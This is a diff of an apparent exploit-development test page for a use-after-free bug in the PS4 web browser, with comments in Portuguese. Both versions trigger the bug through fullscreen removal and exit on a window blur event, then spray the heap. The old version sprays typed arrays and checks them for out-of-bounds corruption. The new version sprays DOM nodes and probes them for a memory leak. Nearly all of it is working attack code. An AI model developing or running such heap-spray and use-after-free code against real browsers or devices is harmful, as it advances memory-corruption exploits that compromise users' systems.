@@ -2,134 +2,95 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 UAF - Teste 4 + Reclaim (FIEL)</title>
+<title>UAF → DOM Leak</title>
 </head>
-<body style="background:#222;color:#0f0;font-family:monospace;">
+<body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>Teste 4 (Exploit Path)</h2>
-<button onclick="runTest()">Run Test</button>
+<h2>UAF DOM Leak Probe</h2>
+<button onclick="run()">Run</button>
 
-<div id="log"></div>
+<pre id="log"></pre>
 
 <script>
-function log(msg) {
-    try { console.log(msg); } catch(e){}
-    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
+function log(m){
+    document.getElementById("log").textContent += m + "\n";
 }
 
-function setupHeap() {
-    let controllers = [];
-
-    for(let i = 0; i < 5000; i++) {
-        let arr = new Float64Array(8);
-        arr[0] = i;
-        controllers.push(arr);
-    }
-
-    return controllers;
+function setupFS(){
+    let d = document.createElement("div");
+    d.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>PRESS OPTIONS</h1>";
+    d.style = "position:absolute;top:0;left:0;width:100%;height:100%;background:black;";
+    document.body.appendChild(d);
+    d.webkitRequestFullscreen();
+    return d;
 }
 
-function setupFullscreen() {
-    let fsTarget = document.createElement("div");
-    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
-    fsTarget.style.background = "black";
-    fsTarget.style.width = "100%";
-    fsTarget.style.height = "100%";
-    fsTarget.style.position = "absolute";
-    fsTarget.style.top = "0";
-    fsTarget.style.left = "0";
-
-    document.body.appendChild(fsTarget);
-
-    if (fsTarget.webkitRequestFullscreen) {
-        fsTarget.webkitRequestFullscreen();
-    }
-
-    return fsTarget;
-}
-
-// 🔥 RECLAIM AGRESSIVO (SEM ALTERAR FLUXO)
+// 🔥 RECLAIM AGRESSIVO (igual ao que funcionou)
 function aggressiveReclaim() {
-    log("[*] Aggressive reclaim iniciado");
+    log("[*] reclaim agressivo");
 
-    let spray = [];
+    let nodes = [];
 
-    for (let i = 0; i < 30000; i++) {
-        let buf = new ArrayBuffer(0x40);
-        let f64 = new Float64Array(buf);
-        f64[0] = 13.37;
+    for (let i = 0; i < 20000; i++) {
+        let d = document.createElement("div");
 
-        // mistura leve (igual seus testes antigos)
-        let str = "TXT_" + i;
+        // padrão identificável
+        d.textContent = "LEAK_" + i + "_AAAAAAAAAAAAAAAAAAAA";
 
-        spray.push(f64);
-        spray.push(str);
+        nodes.push(d);
     }
 
-    log("[*] Aggressive reclaim finalizado: " + spray.length);
+    return nodes;
 }
 
-function trigger(fsTarget, victims) {
-    log("[*] Trigger: remove + exitFullscreen");
-
-    try {
-        fsTarget.remove();
-
-        if (document.webkitIsFullScreen || document.fullscreenElement) {
-            document.webkitExitFullscreen?.();
-        }
-
-        // 🔥 IMPORTANTE: RECLAIM DEPOIS DO TRIGGER (mas antes do reload)
-        aggressiveReclaim();
-
-    } catch(e) {
-        log("[ERRO] " + e);
-    }
-
-    // 🔴 NÃO MEXER — ISSO É PARTE DO BUG
-    setTimeout(() => location.reload(), 500);
-}
-
-// 🔬 probe leve (não intrusivo)
-function probe(victims) {
+// 🔬 leak probe
+function probe(nodes) {
     log("---- PROBE ----");
 
-    for (let i = 0; i < victims.length; i++) {
-        let v = victims[i];
+    for (let i = 0; i < nodes.length; i++) {
+        let txt = nodes[i].textContent;
 
-        try {
-            if (v.length !== 8 || v.byteLength !== 64) {
-                log("[CORRUPÇÃO DETECTADA]");
-                log("len=" + v.length + " byteLen=" + v.byteLength);
-                log("OOB=" + v[20]);
-                return;
-            }
-        } catch(e) {
-            log("[EXCEPTION] " + e);
+        // 🔥 detectar corrupção
+        if (!txt.includes("LEAK_")) {
+            log("[!!!] STRING CORROMPIDA");
+            log(txt);
+            return;
+        }
+
+        if (txt.length > 100) {
+            log("[!!!] POSSÍVEL LEAK");
+            log(txt);
             return;
         }
     }
 
-    log("[OK] sem corrupção visível");
+    log("[OK] nenhuma anomalia detectada");
 }
 
-function runTest() {
-    const logDiv = document.getElementById("log");
-    logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";
+function trigger(fsTarget) {
+    log("[*] trigger");
 
-    let victims = setupHeap();
-    let fsTarget = setupFullscreen();
+    fsTarget.remove();
+    document.webkitExitFullscreen();
 
-    window.onblur = function() {
-        log("[*] onblur disparado");
+    let nodes = aggressiveReclaim();
 
-        // 🔴 NÃO MEXER — ESSENCIAL
+    setTimeout(() => probe(nodes), 50);
+
+    // 🔴 NÃO MEXER
+    setTimeout(() => location.reload(), 500);
+}
+
+function run(){
+    log("Running... Press OPTIONS");
+
+    let fs = setupFS();
+
+    window.onblur = function(){
+        log("[*] onblur");
+
         setTimeout(() => {
-            trigger(fsTarget, victims);
-
-            // probe leve depois
-            setTimeout(() => probe(victims), 100);
-
+            trigger(fs);
         }, 3000);
     };
 }
